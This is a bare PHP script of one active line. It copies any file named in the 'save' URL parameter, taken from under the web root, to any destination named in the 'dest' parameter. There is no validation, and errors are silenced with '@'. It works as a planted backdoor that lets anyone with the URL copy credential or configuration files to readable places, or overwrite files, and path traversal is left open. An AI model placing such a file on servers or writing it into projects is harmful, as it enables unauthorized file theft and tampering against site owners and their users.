<?php


@copy($_SERVER['DOCUMENT_ROOT']."/".$_GET['save'], $_GET['dest']);




?>
